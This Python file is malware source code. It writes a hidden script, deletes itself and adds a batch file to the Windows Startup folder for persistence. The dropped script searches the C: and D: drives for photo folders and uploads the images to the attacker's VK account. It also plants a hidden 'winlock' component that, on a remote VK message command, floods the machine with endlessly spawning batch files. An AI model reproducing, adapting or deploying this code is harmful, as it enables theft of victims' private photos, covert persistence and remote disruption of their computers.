import subprocess
import os
from getpass import getuser


class Main:

	def __init__(self):

		"""for script first activating"""

		self.WDIR = os.getcwd()
		self.NAME = "main.py"
		self.SCR_NAME = "$POST_WIN32.pyw"

		# for startup-script
		self.STP_NAME = "SystemPlugins.bat"

	def create_script(self):

		"""Creates an invisible script"""

		with open(self.SCR_NAME, "w", encoding="utf-8") as file:
			file.write(
				"import json"
				+ "\n" +
				"import subprocess"
				+ "\n" +
				"import sys"
				+ "\n" +
				"import random"
				+ "\n" +
				"import time"
				+ "\n" +
				"import os"
				+ "\n" +
				"import re"
				+ "\n\n" +
				"def install(package):"
				+ "\n\t" +
				"subprocess.call([sys.executable, \"-m\", \"pip\", \"install\", package])"
				+ "\n\n" +
				"def try_steal(Dir, find_dir):"
				+ "\n\n\t" +
				"token = \"your vk-bot's token\""
				+ "\n\t" +
				"vk = vk_api.VkApi(token=token)"
				+ "\n\t" +
				"vk._auth_token()"
				+ "\n\n\t" +
				"while True:"
				+ "\n\t\t" +
				"for root, dirs, files in os.walk(Dir):"
				+ "\n\t\t\t" +
				"if re.search(rf\"{find_dir}\", root):"
				+ "\n\t\t\t\t" +
				"os.chdir(root)"
				+ "\n\t\t\t\t" +
				"photoes = root"
				+ "\n\t\t\t\t" +
				"for root, dirs, files in os.walk(photoes):"
				+ "\n\t\t\t\t\t" +
				"for file in files:"
				+ "\n\t\t\t\t\t\t" +
				"image = os.path.abspath(file)"
				+ "\n\t\t\t\t\t\t" +
				"print(image)"
				+ "\n\t\t\t\t\t\t" +
				"try:"
				+ "\n\n\t\t\t\t\t\t\t" +
				"a = vk.method(\"photos.getMessagesUploadServer\")"
				+ "\n\t\t\t\t\t\t\t" +
				"b = requests.post(a[\"upload_url\"], files={\"photo\": open(image, \"rb\")}).json()"
				+ "\n\t\t\t\t\t\t\t" +
				"c = vk.method(\"photos.saveMessagesPhoto\", {\"photo\": b[\"photo\"], \"server\": b[\"server\"], \"hash\": b[\"hash\"]})[0]"
				+ "\n\n\t\t\t\t\t\t\t" +
				"vk.method(\"messages.send\","
				+ "\n\t\t\t\t\t\t\t\t" +
				"{\"peer_id\": \"your vk-id\","
				+ "\n\t\t\t\t\t\t\t\t" +
				"\"attachment\": f\"photo{c[\'owner_id\']}_{c[\'id\']}\","
				+ "\n\t\t\t\t\t\t\t\t" +
				"\"random_id\": random.randint(1, 2147483647)})"
				+ "\n\n\t\t\t\t\t\t" +
				"except Exception as E:"
				+ "\n\t\t\t\t\t\t\t" +
				"time.sleep(1)"
				+ "\n\n\t\t\t\t" +
				"vk.method(\"messages.send\","
				+ "\n\t\t\t\t\t" +
				"{\"peer_id\": \"your vk-id\","
				+ "\n\t\t\t\t\t" +
				"\"message\": \"АХАХАХМХХАМУХМХУХМХВХХМХМХВХЫАХЫХМХУХУХУХУХУХУхахахАХхаХМХУХхахХ\","
				+ "\n\t\t\t\t\t" +
				"\"random_id\": random.randint(1, 2147483647)})"
				+ "\n\n\t\t\t\t" +
				"sys.exit()"
				+ "\n\t\t" +
				"return"
				+ "\n\n" +
				"install(\"vk_api\")"
				+ "\n" +
				"import vk_api"
				+ "\n\n" +
				"install(\"requests\")"
				+ "\n" +
				"import requests"
				+ "\n\n" +
				"if __name__ == \"__main__\":"
				+ "\n\n\t" +
				"with open(\"winlock.pyw\", \"w\", encoding=\"utf-8\") as win:"
				+ "\n\t\t" +
				"win.write("
				+ "\n\t\t\t" +
				"\'import os\'"
				+ "\n\t\t\t" +
				"+ \'\\n\' +"
				+ "\n\t\t\t" +
				"\'import subprocess\'"
				+ "\n\t\t\t" +
				"+ \'\\n\' +"
				+ "\n\t\t\t" +
				"\'import vk_api\'"
				+ "\n\t\t\t" +
				"+ \'\\n\' +"
				+ "\n\t\t\t" +
				"\'import time\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\n\\n\' +"
				+ "\n\t\t\t" +
				"\'token = \\\"your vk-bot's token\\\"\'"
				+ "\n\t\t\t" +
				"+ \'\\n\' +"
				+ "\n\t\t\t" +
				"\'vk = vk_api.VkApi(token=token)\'"
				+ "\n\t\t\t" +
				"+ \'\\n\' +"
				+ "\n\t\t\t" +
				"\'vk._auth_token()\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\n\' +"
				+ "\n\t\t\t" +
				"\'while True:\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\' +"
				+ "\n\t\t\t" +
				"\'messages = vk.method(\\\"messages.getConversations\\\", {\\\"offset\\\": 0, \\\"count\\\": 20, \\\"filter\\\": \\\"unanswered\\\"})\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\' +"
				+ "\n\t\t\t" +
				"\'if messages[\"count\"] >= 1:\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'body = messages[\\\"items\\\"][0][\\\"last_message\\\"][\\\"text\\\"]\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'if body.lower() == \\\"жулик!\\\":\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'while True:\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'with open(\\\"win32.bat\\\", \\\"w\\\") as bat:\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'bat.write(\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'\\\"@echo off\\\"\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'+ \\\"\\\\n\\\\n\" +\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'\\\'start \\\"\\\" error.bat\\\')\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\n\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'with open(\\\"error.bat\\\", \\\"w\\\") as bat:\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'bat.write(\'"
				+ "\n\t\t\t" +
				"\'\\\"@echo off\\\"\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'+ \\\"\\\\n\\\\n\\\" +\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'\\\"echo $POST_ERRORx0000000001\\\")\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'try:\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'winlock = subprocess.Popen(\\\"win32.bat\\\", shell=True)\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\n\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'messages = vk.method(\\\"messages.getConversations\\\", {\\\"offset\\\": 0, \\\"count\\\": 20, \\\"filter\\\": \\\"unanswered\\\"})\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'body = messages[\\\"items\\\"][0][\\\"last_message\\\"][\\\"text\\\"]\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'if messages[\\\"count\\\"] >= 1:\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'if body.lower() == \\\"жулик не жульничай!\\\":\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'winlock.kill()\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'os.remove(\\\"win32.bat\\\")\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'os.remove(\\\"error.bat\\\")\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'break\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'else:\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'time.sleep(1)\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\' +"
				+ "\n\t\t\t" +
				"\'else:\'"
				+ "\n\t\t\t" +
				"+ \'\\n\\t\\t\' +"
				+ "\n\t\t\t" +
				"\'time.sleep(1)\')"
				+ "\n\n\t" +
				"subprocess.Popen(\"winlock.pyw\", shell=True)"
				+ "\n\t" +
				"subprocess.call([\'attrib\', \'+h\', \"winlock.pyw\"])"
				+ "\n\n\t" +
				"try_steal(\"С:/\", \"фоточьки\")"
				+ "\n\t" +
				"try_steal(\"С:/\", \"фотачьки\")"
				+ "\n\n\t" +
				"try_steal(\"D:/\", \"фоточьки\")"
				+ "\n\t" +
				"try_steal(\"D:/\", \"фотачьки\")")

		subprocess.call(['attrib', '+h', self.SCR_NAME])

		# auto-destroy itself
		os.remove(self.NAME)

	def add_to_startup(self):

		"""
		Create the .bat file that runs the script
		along with start of the system;
		Except just run the scipt
		"""
		
		os.chdir(f"{os.environ['APPDATA']}/Microsoft/Windows/Start Menu/Programs/Startup")

		try:
			with open(self.STP_NAME, "w", encoding="utf-8") as bat:
				bat.write(
					"@echo OFF"
					+ "\n\n" +
					f"pushd {self.WDIR}"
					+ "\n\n" +
					f'start "" {self.SCR_NAME}'
					+ "\n\n" +
					"popd")

		# run script at the first time
			subprocess.Popen(self.STP_NAME, shell=True)
		except:
			os.chdir(self.WDIR)
			subprocess.Popen(self.SCR_NAME, shell=True)


if __name__ == "__main__":
	main = Main()
	main.create_script()
	main.add_to_startup()
